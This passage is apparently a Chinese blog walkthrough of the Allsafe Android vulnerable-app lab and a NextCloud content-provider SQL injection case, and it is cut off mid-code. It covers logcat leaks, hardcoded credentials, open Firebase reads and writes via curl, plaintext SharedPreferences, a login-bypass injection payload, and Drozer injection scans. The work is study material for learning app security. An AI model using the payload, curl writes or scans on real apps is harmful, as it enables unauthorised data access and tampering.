nav-level-4"><a class="nav-link" href="#Deep-Link%E9%A3%8E%E9%99%A9"><span class="nav-number">2.8.2.</span> <span class="nav-text">Deep Link风险</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Insecure-Broadcast-Receiver"><span class="nav-number">2.9.</span> <span class="nav-text">Insecure Broadcast Receiver</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Broadcast-Receiver%E4%BB%8B%E7%BB%8D"><span class="nav-number">2.9.1.</span> <span class="nav-text">Broadcast Receiver介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Broadcast-Receiver%E9%A3%8E%E9%99%A9"><span class="nav-number">2.9.2.</span> <span class="nav-text">Broadcast Receiver风险</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Vulnerable-WebView"><span class="nav-number">2.10.</span> <span class="nav-text">Vulnerable WebView</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#WebView%E4%BB%8B%E7%BB%8D"><span class="nav-number">2.10.1.</span> <span class="nav-text">WebView介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WebView%E9%A3%8E%E9%99%A9"><span class="nav-number">2.10.2.</span> <span class="nav-text">WebView风险</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Certificate-Pinning"><span class="nav-number">2.11.</span> <span class="nav-text">Certificate Pinning</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SSL-Pinning"><span class="nav-number">2.11.1.</span> <span class="nav-text">SSL Pinning</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9C%A8Android13%E4%B8%AD%E4%BD%BF%E7%94%A8BurpSuite%E6%8A%93%E5%8C%85"><span class="nav-number">2.11.1.1.</span> <span class="nav-text">在Android13中使用BurpSuite抓包</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8OkHttp%E5%9B%BA%E5%AE%9A%E8%AF%81%E4%B9%A6"><span class="nav-number">2.11.1.2.</span> <span class="nav-text">使用OkHttp固定证书</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Android%E9%85%8D%E7%BD%AE%E5%9B%BA%E5%AE%9A%E8%AF%81%E4%B9%A6"><span class="nav-number">2.11.1.3.</span> <span class="nav-text">使用Android配置固定证书</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BASSL-Pinning%E7%BB%95%E8%BF%87"><span class="nav-number">2.11.2.</span> <span class="nav-text">靶场SSL Pinning绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Weak-Cryptography"><span class="nav-number">2.12.</span> <span class="nav-text">Weak Cryptography</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Insecure-Service"><span class="nav-number">2.13.</span> <span class="nav-text">Insecure Service</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Service%E4%BB%8B%E7%BB%8D"><span class="nav-number">2.13.1.</span> <span class="nav-text">Service介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Service%E9%A3%8E%E9%99%A9"><span class="nav-number">2.13.2.</span> <span class="nav-text">Service风险</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Insecure-Providers"><span class="nav-number">2.14.</span> <span class="nav-text">Insecure Providers</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Arbitrary-Code-Execution"><span class="nav-number">2.15.</span> <span class="nav-text">Arbitrary Code Execution</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Native-Library"><span class="nav-number">2.16.</span> <span class="nav-text">Native Library</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Smali-Patch"><span class="nav-number">2.17.</span> <span class="nav-text">Smali Patch</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Android%E6%9E%B6%E6%9E%84"><span class="nav-number">2.17.1.</span> <span class="nav-text">Android架构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Apktool%E8%BF%9B%E8%A1%8C%E5%8F%8D%E7%BC%96%E8%AF%91%E5%92%8C%E9%87%8D%E6%89%93%E5%8C%85"><span class="nav-number">2.17.2.</span> <span class="nav-text">使用Apktool进行反编译和重打包</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="淚笑"
      src="/resources/avatar.jpg">
  <p class="site-author-name" itemprop="name">淚笑</p>
  <div class="site-description" itemprop="description">学的越多，懂的越少</div>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/l3yx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;l3yx" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:1729888211@qq.com" title="E-Mail → mailto:1729888211@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://l3yx.github.io/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/resources/avatar.jpg">
      <meta itemprop="name" content="淚笑">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="l3yx's blog">
      <meta itemprop="description" content="学的越多，懂的越少">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="通过漏洞靶场学习Android应用安全 | l3yx's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          通过漏洞靶场学习Android应用安全
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-12-18 20:39:58" itemprop="dateCreated datePublished" datetime="2024-12-18T20:39:58+08:00">2024-12-18</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-12-26 13:26:00" itemprop="dateModified" datetime="2024-12-26T13:26:00+08:00">2024-12-26</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>8.6k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>31 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p>最近学完了《第一行代码：Android》和《Android应用安全实战：Frida协议分析》，算是简单了解了Android开发和基本的逆向分析、Hook等。但对于Android应用安全，App漏洞挖掘方面的学习还是有点迷茫，比起大量的理论知识，个人还是喜欢直接动手实践，所以收集了很多Android应用漏洞靶场，边实践边补足Android安全相关的知识和技能。这些靶场其实也有公开WriteUp，不过很多原理讲解比较含糊，我觉得作为入门的学习材料，还是很有必要深入分析，并且去思考这些安全风险背后的实际利用场景以及新版本Android系统下这些风险的变化。</p>
<span id="more"></span>

<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>ARM版MacBook和Android Studio自带的虚拟机作为测试环境，镜像我使用的是Android 14.0 (Default Android System Image)，不带Google Play的镜像可以直接获得Root权限，也可以正常使用Frida：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241218214319861.png" class="" title="image-20241218214319861">

<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241218212521659.png" class="" title="image-20241218212521659">

<h2 id="Allsafe"><a href="#Allsafe" class="headerlink" title="Allsafe"></a>Allsafe</h2><p><a target="_blank" rel="noopener" href="https://github.com/t0thkr1s/allsafe">https://github.com/t0thkr1s/allsafe</a></p>
<h3 id="Insecure-Logging"><a href="#Insecure-Logging" class="headerlink" title="Insecure Logging"></a>Insecure Logging</h3><blockquote>
<p>This challange is intended to be solved without decompiling the application. The goal is get the flag from the logs.</p>
</blockquote>
<p>开发中经常会使用日志输出来跟踪调试代码，有时可能会输出敏感数据，通过adb logcat即可查看日志：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat --pid=$(adb shell pidof infosecadventures.allsafe)</span><br></pre></td></tr></table></figure>

<p>靶场将用户输入的secret输出到了日志中：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219115704433.png" class="" title="image-20241219115704433">

<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219095640335.png" class="" title="image-20241219095640335">



<p>实际案例是BitCoin Wallet在日志中输出了OAuth响应： <a target="_blank" rel="noopener" href="https://hackerone.com/reports/5314">https://hackerone.com/reports/5314</a> ，并且系统上的其他应用可以读取到。但是只有Android 4.1之前可以通过申请READ_LOGS权限读取，现在尝试声明该权限会提示如下：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219102625222.png" class="" title="image-20241219102625222">



<p>个人理解谷歌意识到了允许应用读取其他应用日志信息是存在很大安全风险的，后续对相关权限进行了调整，所以目前这类风险大大降低。</p>
<h3 id="Hardcoded-Credentials"><a href="#Hardcoded-Credentials" class="headerlink" title="Hardcoded Credentials"></a>Hardcoded Credentials</h3><blockquote>
<p>I assume you have some familiarity with reverse engineering Android applications. There are 2 hardcoded username:password combination on this fragment. Your task is to access them. Good luck!</p>
</blockquote>
<p>首先使用jadx-gui逆向APK，然后根据Fragment名可以轻易找到对应代码：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219111435952.png" class="" title="image-20241219111435952">

<p>这是一段发起POST请求的代码，关键代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> builder.url(string).post(body).build();</span><br></pre></td></tr></table></figure>

<p>请求地址来自<code>R.string.dev_env</code>，请求内容为当前类的<code>BODY</code>字段，而这两者都包含硬编码的账号密码：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219112202930.png" class="" title="image-20241219112202930">

<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219112311905.png" class="" title="image-20241219112311905">



<p>现实中的案例也都很简单，都是把各种密钥、凭据等硬编码在了应用中： <a target="_blank" rel="noopener" href="https://hackerone.com/reports/246995">https://hackerone.com/reports/246995</a> 、 <a target="_blank" rel="noopener" href="https://hackerone.com/reports/412772">https://hackerone.com/reports/412772</a> 、 <a target="_blank" rel="noopener" href="https://hackerone.com/reports/351555">https://hackerone.com/reports/351555</a> </p>
<p>其实在Web开发中，前端硬编码AK SK、API KEY，后端硬编码账号密码等凭据的情况都很常见，对应到Android安全，也只是把这种问题换了一个端。</p>
<h3 id="Firebase-Database"><a href="#Firebase-Database" class="headerlink" title="Firebase Database"></a>Firebase Database</h3><blockquote>
<p>In this task, the application is getting data from a realtime database. It’s all nice and good but I have a feeling the developers didn’t set the correct rules for production.</p>
</blockquote>
<h4 id="Firebase-Realtime-Database介绍"><a href="#Firebase-Realtime-Database介绍" class="headerlink" title="Firebase Realtime Database介绍"></a>Firebase Realtime Database介绍</h4><p>Firebase Realtime Database 是一种托管在云端的数据库，数据以 JSON 格式存储并实时同步到所连接的每个客户端。这也是移动端常用的一种数据库。</p>
<p>可以参照官方文档接入：<a target="_blank" rel="noopener" href="https://firebase.google.com/docs/database/android/start">https://firebase.google.com/docs/database/android/start</a> ，基本是引入的各种依赖，配置的话只下载了一个专属配置文件google-services.json放到了项目根目录：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219152552805.png" class="" title="image-20241219152552805">

<p>写入和监听数据的代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FirebaseDatabase</span> <span class="variable">database</span> <span class="operator">=</span> FirebaseDatabase.getInstance();</span><br><span class="line"><span class="type">DatabaseReference</span> <span class="variable">myRef</span> <span class="operator">=</span> database.getReference(<span class="string">&quot;message&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write a message to the database</span></span><br><span class="line">myRef.setValue(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read from the database</span></span><br><span class="line">myRef.addValueEventListener(<span class="keyword">new</span> <span class="title class_">ValueEventListener</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDataChange</span><span class="params">(<span class="meta">@NonNull</span> DataSnapshot dataSnapshot)</span> &#123;</span><br><span class="line">        <span class="comment">// This method is called once with the initial value and again</span></span><br><span class="line">        <span class="comment">// whenever data at this location is updated.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> dataSnapshot.getValue(String.class);</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Value is: &quot;</span> + value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCancelled</span><span class="params">(<span class="meta">@NonNull</span> DatabaseError error)</span> &#123;</span><br><span class="line">        <span class="comment">// Failed to read value</span></span><br><span class="line">        Log.w(TAG, <span class="string">&quot;Failed to read value.&quot;</span>, error.toException());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>写入后在控制台也可以看到该条数据：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219152401039.png" class="" title="image-20241219152401039">

<p>当前的Firebase Security Rules我选择的是测试模式，在指定时间前允许任何人读取和写入：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219153018462.png" class="" title="image-20241219153018462">



<p>参考 <a target="_blank" rel="noopener" href="https://firebase.google.com/docs/database/rest/start">https://firebase.google.com/docs/database/rest/start</a> ，我们也可以直接通过HTTP请求读取和写入数据：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;https://fir-xxxxx-default-rtdb.firebaseio.com/.json?print=pretty&#x27;</span><br><span class="line">curl -X PUT -d &#x27;&quot;content&quot;&#x27; &#x27;https://fir-xxxxx-default-rtdb.firebaseio.com/test.json?print=pretty&#x27;</span><br></pre></td></tr></table></figure>

<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219154054590.png" class="" title="image-20241219154054590">



<h4 id="Firebase-Realtime-Database使用风险"><a href="#Firebase-Realtime-Database使用风险" class="headerlink" title="Firebase Realtime Database使用风险"></a>Firebase Realtime Database使用风险</h4><p>从该数据库的使用上来看，可能存在的风险便是开发者没有正确配置Firebase Security Rules，导致数据库可被公共读写。</p>
<p>我逆向自己项目编译出的APK后尝试查找该数据库URL：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219155708363.png" class="" title="image-20241219155708363">

<p>发现数据库URL结构如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">databaseUrl = <span class="string">&quot;https://&quot;</span> + app.getOptions().getProjectId() + <span class="string">&quot;-default-rtdb.firebaseio.com&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>ProjectId则可以在字符串资源中找到：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219155907805.png" class="" title="image-20241219155907805">



<p>对于靶场APK，可以在字符串资源中直接找到数据库URL：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219160152217.png" class="" title="image-20241219160152217">

<p>该数据库存在公共读问题：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219160502458.png" class="" title="image-20241219160502458">



<p>实际案例如下：</p>
<p><a target="_blank" rel="noopener" href="https://medium.com/@fs0c131y/how-i-found-the-database-of-the-donald-daters-app-af88b06e39ad">https://medium.com/@fs0c131y/how-i-found-the-database-of-the-donald-daters-app-af88b06e39ad</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.securitybreached.org/2020/02/04/exploiting-insecure-firebase-database-bugbounty/">https://blog.securitybreached.org/2020/02/04/exploiting-insecure-firebase-database-bugbounty/</a></p>
<p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/731724">https://hackerone.com/reports/731724</a></p>
<p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/1065134">https://hackerone.com/reports/1065134</a></p>
<h3 id="Insecure-Shared-Preferences"><a href="#Insecure-Shared-Preferences" class="headerlink" title="Insecure Shared Preferences"></a>Insecure Shared Preferences</h3><blockquote>
<p>Shared preferences are, by default, stored within the app’s data directory with filesystem permissions set that only allow the UID that the specific application runs with to access them. Also, if someone was able to mount your device’s filesystem without using the installed Android OS, they could also bypass the permissions that restrict access.</p>
</blockquote>
<h4 id="SharedPreferences介绍"><a href="#SharedPreferences介绍" class="headerlink" title="SharedPreferences介绍"></a>SharedPreferences介绍</h4><p>Android中的数据持久化存储有多种方案：SharedPreferences、文件存储、SQLite数据库等，其中SharedPreferences适用于存储少量键值对数据，参考 <a target="_blank" rel="noopener" href="https://developer.android.com/training/data-storage/shared-preferences">https://developer.android.com/training/data-storage/shared-preferences</a> 使用SharedPreferences读写数据的代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SharedPreferences</span> <span class="variable">sharedPref</span> <span class="operator">=</span> <span class="built_in">this</span>.getSharedPreferences(<span class="string">&quot;test&quot;</span>, Context.MODE_PRIVATE);</span><br><span class="line">SharedPreferences.<span class="type">Editor</span> <span class="variable">editor</span> <span class="operator">=</span> sharedPref.edit();</span><br><span class="line">editor.putString(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;leixiao&quot;</span>);</span><br><span class="line">editor.apply();</span><br><span class="line"></span><br><span class="line">Log.d(TAG,sharedPref.getString(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;null&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>数据会以XML文件形式存储在<code>/data/data/&lt;package_name&gt;/shared_prefs</code>目录 (需要Root权限查看)：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219164959652.png" class="" title="image-20241219164959652">



<h4 id="SharedPreferences风险"><a href="#SharedPreferences风险" class="headerlink" title="SharedPreferences风险"></a>SharedPreferences风险</h4><p>在获取SharedPreferences对象时可以指定模式，当指定为MODE_WORLD_READABLE和MODE_WORLD_WRITEABLE时，其他应用可以对其数据进行读写，将会造成信息泄露和伪造，这两种模式已经在Android 4.2废弃：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219170814612.png" class="" title="image-20241219170814612">



<p>不过就算无法被其他应用直接读取，也应该避免将密码等敏感信息直接存储于SharedPreferences。靶场APK对应代码如下：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219171545384.png" class="" title="image-20241219171545384">

<p>使用的是MODE_PRIVATE(0)模式，但是将密码进行了明文存储。</p>
<h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><blockquote>
<p>This task can be easily completed without reverse enigneering the app. The goal is to bypass the following login page by exploiting a simple SQL injection vulnerability.</p>
</blockquote>
<h4 id="靶场漏洞"><a href="#靶场漏洞" class="headerlink" title="靶场漏洞"></a>靶场漏洞</h4><p>查看代码，发现是使用原始SQL语句对SQLite数据库进行操作，用户的输入被直接拼接到了语句中：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219174013159.png" class="" title="image-20241219174013159">

<p>很典型的SQL注入漏洞，用户名填<code>&#39; or true or &#39;</code>，密码随意，即可查询出所有用户数据。</p>
<p>从安卓官方示例 <a target="_blank" rel="noopener" href="https://developer.android.com/training/data-storage/sqlite">https://developer.android.com/training/data-storage/sqlite</a> 中可以看到推荐写法都是采用了参数化或者ORM框架，一般正常使用都不会产生SQL注入问题。</p>
<h4 id="NextCloud-Android-App-Content-Provider-SQL注入-CVE-2019-5454-分析与修复绕过"><a href="#NextCloud-Android-App-Content-Provider-SQL注入-CVE-2019-5454-分析与修复绕过" class="headerlink" title="NextCloud Android App Content Provider SQL注入(CVE-2019-5454)分析与修复绕过"></a>NextCloud Android App Content Provider SQL注入(CVE-2019-5454)分析与修复绕过</h4><p>案例来自：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/291764">https://hackerone.com/reports/291764</a></p>
<p>NextCloud App 漏洞版本下载：<a target="_blank" rel="noopener" href="https://download.nextcloud.com/android/nextcloud-20000199.apk">https://download.nextcloud.com/android/nextcloud-20000199.apk</a></p>
<h5 id="Drozer基本使用"><a href="#Drozer基本使用" class="headerlink" title="Drozer基本使用"></a>Drozer基本使用</h5><p>参考 <a target="_blank" rel="noopener" href="https://labs.withsecure.com/tools/drozer">https://labs.withsecure.com/tools/drozer</a> 安装Drozer，并扫描Content Provider中的注入：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">drozer console connect</span><br><span class="line">run scanner.provider.injection -a com.nextcloud.client</span><br></pre></td></tr></table></figure>

<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20241219201100021.png" class="" title="image-20241219201100021">

<p>可以看到在content:&#x2F;&#x2F;org.nextcloud&#x2F;中，Projection和Selection都存在注入漏洞。（Projection用于指定返回哪些列，Selection用于指定筛选条件）</p>
<h5 id="Content-Provider介绍"><a href="#Content-Provider介绍" class="headerlink" title="Content Provider介绍"></a>Content Provider介绍</h5><p>Content Provider是Android 四大组件之一，简单来说就是可以在自己应用中实现Content Provider以允许其他应用读取和修改自己应用中的数据：</p>
<img src="/2024/12/18/%E9%80%9A%E8%BF%87%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0Android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/content-provider-overview.png" class="" title="content-provider-overview">

<p>示例ContentProvider代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyContentProvider</span> <span class="keyword">extends</span> <span class="title class_">ContentProvider</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">authority</span> <span class="operator">=</span> <span class="string">&quot;com.example.demo.provider&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> MySQLiteOpenHelper mySQLiteOpenHelper;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">UriMatcher</span> <span class="variable">uriMatcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UriMatcher</span>(UriMatcher.NO_MATCH);</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onCreate</span><span class="params">()</span> &#123;</span><br><span class="line">        mySQLiteOpenHelper = <span class="keyword">new</span> <span class="title class_">MySQLiteOpenHelper</span>(<span class="built_in">this</span>.getContext(), <span class="string">&quot;test.db&quot;</span>, <span class="literal">null</span>, <span class="number">1</span>);</span><br><span class="line">        uriMatcher.addURI(authority, <span class="string">&quot;user&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> Cursor <span class="title function_">query</span><span class="params">(<span 